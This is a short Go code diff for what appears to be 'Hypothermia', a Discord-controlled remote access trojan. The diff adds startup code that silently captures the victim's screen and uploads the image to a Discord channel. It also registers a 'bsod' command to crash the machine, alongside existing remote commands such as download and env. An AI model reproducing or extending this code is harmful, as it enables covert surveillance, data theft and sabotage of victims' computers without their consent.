@@ -13,6 +13,7 @@ import (
 
 	"Hypothermia/config"
 	"Hypothermia/src/bot/commands"
+	"Hypothermia/src/funcs"
 	"Hypothermia/src/utils"
 	"Hypothermia/src/utils/crypto"
 
@@ -127,6 +128,16 @@ func Init() {
 		),
 	)
 
+	buf, code := funcs.Screenshot()
+	if code == 0 {
+		dg.ChannelMessageSendComplex(channel, &discordgo.MessageSend{
+			Files: []*discordgo.File{{
+				Name:   "ss.jpg",
+				Reader: buf,
+			}},
+		})
+	}
+
 	select {}
 }
 
@@ -180,6 +191,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 func register() {
 	commandsList["audio"] = &commands.AudioCommand{}
 	commandsList["brightness"] = &commands.LightCommand{}
+	commandsList["bsod"] = &commands.BSODCommand{}
 	commandsList["critical"] = &commands.Criticalommand{}
 	commandsList["download"] = &commands.DownloadCommand{}
 	commandsList["env"] = &commands.EnvCommand{}
